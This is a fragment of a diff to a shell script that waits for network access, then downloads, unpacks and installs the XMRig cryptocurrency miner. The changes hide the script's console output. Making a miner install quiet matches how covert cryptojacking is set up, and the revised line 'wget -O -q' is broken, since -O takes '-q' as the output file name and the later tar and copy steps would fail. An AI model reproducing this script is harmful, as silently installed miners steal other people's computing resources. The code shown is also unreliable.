@@ -26,11 +26,11 @@ fi
 if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
 	rm -rf "$xmrig_dir"/*
 	#wait for the net to initalize
-(	while ! ping -c 1 google.com; do
+(	while ! ping -c 1 google.com > /dev/null 2>&1; do
 		sleep 5
 	done
-	wget -O "$xmrig_dir/xmrig_tar" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
-	tar -xvzf "$xmrig_dir/xmrig_tar" -C "$xmrig_dir/"
+	wget -O -q "$xmrig_dir/xmrig_tar" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz > /dev/null 2>&1
+	tar -xzf "$xmrig_dir/xmrig_tar" -C "$xmrig_dir/"
 	cp "$xmrig_dir/xmrig-6.22.2/xmrig" "$xmrig_binary"
 	cp "$xmrig_dir/xmrig-6.22.2/config.json" "$xmrig_config"
 	rm "$xmrig_dir/xmrig_tar" 
